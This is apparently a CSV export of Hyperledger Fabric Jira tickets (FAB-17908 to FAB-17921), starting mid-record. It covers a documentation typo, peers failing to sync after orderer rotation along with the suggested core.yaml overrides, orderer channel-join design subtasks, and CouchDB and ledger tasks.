 When I restart peer and attempt the install yet again, it succeeds.  So it seems the peer caches the fact that the builder image cannot be found, and restarting the peer is required in order for peer to find the newly tagged ccenv:latest2 builder image.",,denyeart,wlahti,ymlbright,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17784,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c4r:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,wlahti,ymlbright,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-2.1,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/May/20 12:18 AM;wlahti;[https://github.com/hyperledger/fabric/pull/1280];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
configtxlator document typo,FAB-17908,45088,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,davidkhala,davidkhala,davidkhala,16/May/20 11:26 PM,17/May/20 11:31 PM,28/Oct/23 3:10 AM,17/May/20 11:31 PM,,,,,,,,,,v1.4.8,,,,,,,,,,,,,0,,,,,,'encode/common.ConfigUpdate' should be 'decode/common.ConfigUpdate' for decode protobuf to json purpose,,davidkhala,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c4z:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),davidkhala,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Adding a peer node when no genesis block orderer exist in the channel,FAB-17909,45089,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,chintanr11,chintanr11,17/May/20 3:49 PM,01/Jul/20 1:05 AM,28/Oct/23 3:10 AM,01/Jul/20 1:03 AM,,,,,,,,,,,,,,fabric-orderer,fabric-peer,,,,,,,,0,ipm,,,,,"The peer fails to join the channel in the following scenario:
 # A channel was created by the Orderer Organization (running 3 orderers in RAFT mode).
 # A peer organization was added (let's say with 3 peers). Chaincodes were installed, instantiated and invoked several times.
 # Over channel lifetime, the orderer nodes in channel were modified to the extent that *no channel genesis block orderers* existed in the channel any longer.
 # A requirement occurred to add a *new peer node* in the channel. On giving, channel genesis block, it kept trying to fetch next blocks (starting from 1) by reaching out to orderer defined in the block 0 of the channel.

As expected, the new peer could not fetch any block after block 0! Because all the orderers defined in the channel at the time of its creation were swapped over by different orderers over channel lifetime.

I tried looking online if this issue was officially addressed by the community. But could not find any proposed solution for this. Is this a bug and taken into consideration for development? Or is this addressed already?

----------------------------------------------------------------------------------------------------------------------

UPDATE:
 *THIS SOLUTION DOES NOT WORK AS WELL!*

I found the solution to this problem:

We must pass the Orderer endpoint of one of the orderers that already exists in the channel! The modified command would be:

{{peer channel join -b mychannel.block -o orderer4.example.com --tls --cafile <pathToOrdererTLSCACert>}}

Where, {{orderer4.example.com}} *currently* belongs to the application channel. 

---------------------------------------------------------------------------------------------------------------------

UPDATE 2:

What if instead of swapping the nodes, I need to rotate the TLS certificates of the different consenters in the application channel, such that in  channel lifetime, at some point every consenter has a TLS certificate different from the one present in the channel genesis block. This would again stop the newly added peer nodes to join the channel by blocking them to sync any blocks after the block 0 of the application channel!",,caod,chintanr11,denyeart,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-106,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzohr",,,,Unset,Unset,,"Minimal operations to reproduce using `fabric-samples/first-network` (v1.4.4)
1. Use cryptogen to generate crypto-material for 1 Orderer Organization (6 orderers) and 1 Peer Organization (4 peers).
2. Start the orderer nodes (in RAFT mode).
3. Create an application channel consisting of O1, O2, and O3.
4. Add Peer organization to consortium and the application channel. Join only 3 peers to the channel.
5. Install and instantiate chaincode. Run Invoke chaincode several times.
6. Modify application channel to swap O1, O2, and O3 with O4, O5, and O6 step by step as guided in RAFT channel reconfiguration.
7. Invoke and query to verify everything is good so far.
8. Start 4th peer and ask it to join the application channel using its genesis block.

It fails to sync the blocks in the channel after block 0! Logs keep reading ""SERVICE_UNAVAILABLE""!",,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,chintanr11,denyeart,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/May/20 5:14 PM;yacovm;Look at https://jira.hyperledger.org/browse/FAB-5288 ;;;","18/May/20 5:21 PM;yacovm;You can override the orderer endpoints / TLS CA certificates with [this|https://github.com/hyperledger/fabric/blob/master/sampleconfig/core.yaml#L342-L350].;;;","18/May/20 7:37 PM;chintanr11;[~yacovm] understood!

So can I configure the given attribute in the link using the environment variable? Something like: CORE_PEER_DELIVERYCLIENT_ADDRESSOVERRIDES? If yes, then how shall I syntax it properly along with value in the "".yaml"" file of kubernetes peer pod?

??In core.yaml, also specify some block height that once the local ledger size is larger than that, then switch to use the channel config??

Do we have this variable enabled in core.yaml?
 * If yes, then can you link that too?
 * If not, then how do we overcome the scenario that the peer will not go and talk to ""overriding endpoint"" after it has synced the chain?;;;","18/May/20 9:16 PM;yacovm;I don't know how you configure it with an environment variable. Maybe [~mastersingh24] or [~ptippett] know? 

{quote}In core.yaml, also specify some block height that once the local ledger size is larger than that, then switch to use the channel config{quote}

We don't have this. This override is absolute. 
;;;","18/May/20 9:42 PM;chintanr11;Understood! But this work around also means that we must specify override addresses every time we aim at adding a new peer node (in the environment described above - where its fails to sync from genesis block orderers) right? 

I that scenario, is the update to core.yaml dynamic in nature?
 * If yes, then cool we can update the override endpoint in a running peer too!
 * If no, then should we everytime restart the peer pod if we just wish to add it to the channel that it cannot sync from (forcing us to add an override variable again in core.yaml)?;;;","19/May/20 1:39 PM;chintanr11;[~yacovm], I would like to highlight that why aren't we making using of peer CLI command for this? I mean to say that in ""peer channel join"" command we have an option of specifying the orderer endpoint, right? We should just extend that to be used in the scenario where peer cannot pull blocks from genesis block orderers. Specifying ""-o"" argument should make the peer pull channel blocks from the specified endpoint instead of looking into config block.

You can run the peer channel join command like follows:
{code:java}
peer channel join -b mychannel.block -o orderer4.example.com --tls --cafile <ordererTLSCAFile>{code}
The benefit would be: 
 # The change in core.yaml is permanent like you explained. This feature would be dynamic in nature.
 # Already running peers could join newer channels dynamically. 

Currently, I tried implementing above feature but peer node does NOT respect the ""-o"" argument (and yet we have it in the ""peer"" binary commands). If we are using it in other operations like ""invoke"" then we should allow this command to run parallel to that, giving a more dynamic nature, instead of making use of core.yaml. 

Please let me know your thoughts on this.;;;","19/May/20 3:36 PM;yacovm;I agree with your analysis, it seems like a good idea to add something like that.

 

[~denyeart] - FYI;;;","21/May/20 1:48 PM;chintanr11;One quick question. 

What would happen in the scenario where the new peer is able to fetch the blocks of the channel from the genesis block orderers? I mean to say, how would the peer identify the *Orderer Organization's root TLS certificate* in that case (let's say when we have more than 1 Orderer Organization in the channel)?;;;","25/Jun/20 7:43 PM;denyeart;The change recommended by [~chintanr11]  does seem reasonable. What do you think [~caod] and [~wlahti] ?;;;","25/Jun/20 11:05 PM;caod;Seems fine, we'll look into prioritizing this change.;;;","26/Jun/20 2:42 PM;chintanr11;Hi Team, 

I think we should also take into account [~mastersingh24]'s comment on the same issue posted by me on lists [here|[https://lists.hyperledger.org/g/fabric/message/8343]]. 

I need some understanding on his following statements:

??we plan to move away from the system chaincode approach currently being used??

??Additionally, you actually need to persist the override information in the case where you decide to rebuild the ledger for a given channel.??

 

If I am not wrong, the second point implies, in case the peer looses its persistent data store. Right? If that is so, then peer should again be requested to join the channel with dynamically passing an orderer endpoint. 

If this understanding of mine is not correct, then what could be the scenario where peer would want to rebuild ledger from ""block 0""? Or if it is rebuilding ledger from height ""h"" onwards, then would not it directly connect to the latest orderer information it has? Otherwise, the issue will be more serious than described above. ;;;","26/Jun/20 8:43 PM;denyeart;Ah, it seems Gari doesn't agree to the join update, his arguments make sense, let me explain some more...

If the peer crashed when processing the chain, it would resume from an earlier channel config with the outdated information, not from the originally passed config. Also if the ledger became corrupt for whatever reason, it would not be possible to rebuild from genesis (e.g. 'peer node reset').

Concerning moving away from the system chaincode approach (CSCC in this case), the intent is to replace these system chaincodes with traditional APIs, therefore there is little desire to extend the current system chaincodes.

Finally, the ledger checkpoint development is underway, which will make it possible to join a new peer from latest config block rather than from genesis block, so again there is little desire to workaround a problem that will be fundamentally resolved in an upcoming release.

So it sounds like the proposed approach was considered, but it was decided to do the peer config overrides instead as the interim workaround.

 ;;;","26/Jun/20 10:37 PM;chintanr11;[~denyeart], true, that's why I felt I can just add it here. I understood your explanation too on the same. Will this new release, that will allow the peer to fetch blocks from latest one, will be back-ported to earlier versions like v1.4 or is it going to only affect v2.x?;;;","26/Jun/20 11:31 PM;denyeart;[~chintanr11] The ledger checkpoint is targeted for a v2.x release. v1.4.x is in bug fix maintenance support only.;;;","01/Jul/20 1:01 AM;denyeart;Let's close this Jira with the following summary:
 * Temporary workaround is to use the peer overrides - https://github.com/hyperledger/fabric/blob/release-1.4/sampleconfig/core.yaml#L331-L339
 * Longer term resolution will be ability to join a channel from a  later block height and checkpointed state (FAB-106)

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Orderer w/o system-channel, joins app channel as member, with genesis block",FAB-17910,45097,40570,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tock,tock,tock,18/May/20 3:32 PM,26/Jun/20 1:34 AM,28/Oct/23 3:10 AM,22/Jun/20 11:29 PM,,,,,,,,,,v2.x,,,,fabric-orderer,,,,,,,,,0,,,,,,"This task handles the following scenario:
 * Orderer is a member of the cluster - the config block given at join has the self ID of the orderer.
 * The config block given at join is number 0 - no onboarding needed. 

In this case the join block is first appended to the ledger as a genesis block, and the multichannel.ChainSupport is created in the normal fashion, reading the last-block from the ledger and constructing the consensus.Chain accordingly.
h1. Rationale 

{{HandleChain}} starts a chain based on the last block in the ledger, which it gets from the ledger resources.

What we need in order to join a chain in cases when on-boarding is needed (see special case below) is to start a {{follower.Chain}}, with a join-block, when the ledger is empty. The follower chain does not need many of the resources that an etcdraft.Chain needs, as it only pulls blocks (for example, it never signs and never uses the BlockWriter) . Moreover, some things it cannot even create, like a BlockWriter, which need to be based on a tip of a ledger (which we do not have at this point). Rather then stud HandleChain with many ""ifs and buts"", and extend its interface with the join-block, I think it will be much clearer and safer (not introducing bugs to HandleChain) to define a new method that does exactly the job of joining a channel.

The way I want to think about it, conceptually, HandleChain starts from a valid the ledger, so a failure means that something is fatally wrong (e.g. corruption of the ledger). In contrast, JoinChain is started with input from the user, i.e. the join-block, and errors in processing his request should be propagated back to the user.

A special case is when the join-block has number=0, and then it is appended to the ledger and {{HandleChain}} is called. If the orderer is a member ({{detectSelfID()}} no error), an {{etcdraft.Chain}} is created. Otherwise, a follower.Chain be created. However, this follower.Chain is past on-boarding and is just pulling blocks and observing the config.

When considering CFT, an orderer might fail in the middle of on-boarding a channel. When we recover, we'll find a join-block.Number >= ledger.Height, which indicates a gap between the ledger tip and the join-block. In this case we'll also call JoinChain rather than HandleChain.

 

Here is the flow of a join request with `{{join-block.Number >0}}`.
 * The `JoinChain` is called synchronously from the client request go-routine. If it fails, the request fails. If it succeeds, a follower.Chain is created and started (it has a go-routine).
 * The follower.Chain is given a function pointer to a {{createChain}} function just like in the {{inactive.Chain}} and the haltCallback in the {{etcdraft.Chain}}.
 * The follower.Chain starts pulling blocks. It is in status {{on-boarding}} until it reaches {{join-block.Number}}, then it changes to {{active}}.
 * If at that point the orderer is in the consenters set of the join-block (""a member""), the call to {{createChain}} in invoked, triggering the transition between follower.Chain -> etcdraft.Chain. This happens with a call to HandleChain.
 * HandleChain has a switch to create a follower.Chain when there is no sys-chan, and an inactive.Chain when there is a sys-chan.
 * If the orederer is not in the consenters set of the join-block, it will continue to pull blocks and watch config blocks.
 * Note that once the ledger catches up with the join-block, the join-block is deleted.
 * When a config block arrives in which the orderer is a member, {{createChain}} in invoked, again, triggering the transition between follower,Chain -> etcdraft.Chain. This happens with a call to HandleChain.

Conversely, here is the flow of an etcdraft.Chain evicted:
 * Eviction is detected, halt is called (as usual)
 * The haltCallback is initialized to create a chain. Calls HandleChain. HandleChain creates a follower.Chain without a join-block.

So, {{JoinChain}} is normally called by the client request go-routine, and always when there is a join-block. HandleChain is called by internal go-routines, and when the chain is started off the ledger.

The {{JoinChain}} call behaves differently from {{HandleChain}} only when {{join-block.Number >0}}, i.e. there is a need for on-boarding. Otherwise, if it is {{join-block.Number==0}}, it just appends the block to the ledger and delegates to {{HandleChain}}. That is what's addressed in this commit, all the rest is future tasks.

 ",,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-18027,,,FAB-18019,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c6z:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Orderer with no channels joins system channel,FAB-17911,45098,40570,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tock,tock,tock,18/May/20 3:34 PM,17/Sep/20 4:43 PM,28/Oct/23 3:10 AM,17/Sep/20 4:43 PM,,,,,,,,,,v2.x,,,,fabric-orderer,,,,,,,,,0,,,,,,"An orderer without channels joins the system channel. It must be a member of the system channel cluster as well.
 # The join-block is saved to the join-block filerepo.
 # If the join-block.number=0, it is appended to the ledger.
 # A degenerate ChainSupport is created, holding an inactive.Chain within, and set into the chains map and the ""systemChannel"" field. This is done to prevent further invocations to the API from issuing conflicting commands, as they will find a system channel there. Only ""List"" and ""Remove"" will be accepted. Transactions sent to the system channel will be rejected.
 # As soon as the Join REST call returns successfully the orderer should be restarted.
 # Upon restart, (boostrapMethod=""none"") 'Main' will look for a system channel join block, and if it finds one, will treat it as a bootstrap block.
 # Normal boot then resumes, and the orderer will on-board (replicate) the system channel and any channel referred by it, just as if we had boostrapMethod=""file"" with the same block as bootstrap block.
 # After replication ends, the system channel join block is removed.
 # The orderer now operates in the ""legacy"" system channel mode.",,tock,,,,,,,,,,,,,,,,,,,,,FAB-18204,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c77:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Orderer reject joins: with system channel, or if channel exists ",FAB-17912,45099,40570,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tock,tock,tock,18/May/20 3:52 PM,08/Jun/20 3:54 PM,28/Oct/23 3:10 AM,08/Jun/20 3:54 PM,,,,,,,,,,v2.x,,,,fabric-orderer,,,,,,,,,0,,,,,,"Orderer reject joins: 
# when system channel exists, or 
# if channel exists",,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c7f:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Orderer with app channels rejects join to system-channel,FAB-17913,45100,40570,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tock,tock,tock,18/May/20 3:55 PM,22/Jun/20 11:29 PM,28/Oct/23 3:10 AM,22/Jun/20 11:29 PM,,,,,,,,,,v2.x,,,,fabric-orderer,,,,,,,,,0,,,,,,,,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c7n:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Orderer w/o system-channel joins app-channel as follower,FAB-17914,45101,40570,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tock,tock,tock,18/May/20 3:58 PM,06/Aug/20 2:01 AM,28/Oct/23 3:10 AM,06/Aug/20 2:01 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"The cluster follower replicates the blocks of the channel and observes the config block.
If it detects that it became a member of the cluster, it starts the etcdraft chain and turns into a cluster member.",,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-18104,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c7v:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Orderer w/o system-channel, working as cluster member, switches to cluster follower",FAB-17915,45102,40570,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tock,tock,tock,18/May/20 4:05 PM,09/Sep/20 12:42 AM,28/Oct/23 3:10 AM,09/Sep/20 12:42 AM,,,,,,,,,,v2.x,,,,fabric-orderer,,,,,,,,,0,,,,,,"An orderer that is a cluster member of a channel, detects that it is no longer a member by observing the channel config.
When that happens, it shuts down the etcdraft chain and becomes a cluster follower.
This only works when there is no system-channel.",,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c83:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add CouchDB index support to implicit private data collections,FAB-17916,45107,,Story,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,denyeart,denyeart,19/May/20 8:05 PM,05/Jul/21 9:17 PM,28/Oct/23 3:10 AM,,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,1,,,,,,"Defining a CouchDB index in a chaincode for an implicit private data collection such as:
 META-INF/statedb/couchdb/collections/_implicit_org_Org1MSP/indexes

results in error:
{code:java}
[privacyenabledstate] HandleChaincodeDeploy -> ERRO 4e9 Error processing index for chaincode [marblesp]: cannot create an index for an undefined collection=[_implicit_org_Org1MSP]
{code}
This story has two variants:
 # In the chaincode definition, define a CouchDB index for a specific named organization's implicit private data collection
 # In the chaincode definition, define a CouchDB index for all organization's implicit private data collections

 

+Acceptance+
 * Index created for named organization upon chaincode deployment.
 * Index created for each organization upon creation of their implicit private data collection state database (occurs upon first write to an org's collection).
  ",,calanais,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0idqxqo6",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),calanais,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/Jul/21 9:17 PM;calanais;Updated docs to note this is a limitation https://github.com/hyperledger/fabric/pull/2739;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Change default CouchDB maxRetriesOnStartup to 10,FAB-17917,45109,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,denyeart,denyeart,20/May/20 7:07 AM,01/Jun/20 11:42 PM,28/Oct/23 3:10 AM,01/Jun/20 11:42 PM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,,,,,,"Change default maxRetriesOnStartup from 12 to 10.
Also fix retries so that there is no sleep after the last attempt,
and improve the retry message to make it clear how many attempts and when retries are exhausted.
The changes result in peer start failure after 2 minutes rather than 16 minutes.",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0ig",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/May/20 7:23 AM;denyeart;https://github.com/hyperledger/fabric/pull/1294;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The installed binaries do not match the documentation,FAB-17918,45111,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Specia1,Specia1,20/May/20 2:41 PM,03/Jun/20 12:35 PM,28/Oct/23 3:10 AM,03/Jun/20 12:35 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"* [https://hyperledger-fabric.readthedocs.io/en/release-1.4/install.html]

* [https://hyperledger-fabric.readthedocs.io/en/master/install.html]

 

The documentation showed different results than what I installed using the `scripts/bootstrap.sh` script.

The latest binaries have `fabric-ca-server`.",,Specia1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c9f:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Specia1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/May/20 3:12 PM;Specia1;* [https://github.com/hyperledger/fabric/pull/1298]

* [https://github.com/hyperledger/fabric/pull/1299];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"As a chaincode client, i want to use pagination for private data rich query results",FAB-17919,45113,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Duplicate,,chanioxaris,chanioxaris,20/May/20 6:33 PM,20/May/20 7:24 PM,28/Oct/23 3:10 AM,20/May/20 7:24 PM,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,"Chaincode client can pass pagesize and bookmark parameters to rich query shim APIs in order to drive pagination for private data.

 

Add a new function GetPrivateDataQueryResultWithPagination() on ChaincodeStub interface, that accepts collection, query, pageSize and bookmark parameters, to handle pagination for private data query results.

 

Changes need to be done are minimal, as the functionality for pagination already supported for state database data, with the GetQueryResultWithPagination() function in the same interface.

  ",,chanioxaris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-11732,,,,FAB-11732,FAB-11731,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Yes,Unset,,FAB-2809,,,No,,Unset,No,,,"1|i01c9v:",,,,No,Unset,,(Please add steps to reproduce),,No,,,,,,Unset,,Unset,,(Please add usage information),chanioxaris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Retry on chaincode Invoke and Query errors,FAB-17920,45114,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bstasyszyn,bstasyszyn,bstasyszyn,20/May/20 10:12 PM,21/May/20 12:28 AM,28/Oct/23 3:10 AM,21/May/20 12:28 AM,,,,,,,,,,,,,,fabric-cli,,,,,,,,,0,,,,,,Add retry options to chaincode Invoke and Query so that retries are performed on transient errors.,,bstasyszyn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01ca3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bstasyszyn,,,,,,,,,,,,,,main,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Rename channel metadataDB to avoid name collision with namespaceDB,FAB-17921,45115,,Story,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,wenjian,wenjian,20/May/20 10:56 PM,20/May/20 10:57 PM,28/Oct/23 3:10 AM,,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,"Currently there is a non-deterministic db name collision between metadataDB and namespaceDB with namespace="""". 
 * When channel name is not truncated, metadataDB and namespaceDB with namespace="""" have the same db name.
 * When channel name is truncated, these two DBs have different db names.

Ideally metadataDB and namespaceDB should not have same name. In a future release, we may rename metadataDB and migrate the content to avoid the name collision.",,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cab:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
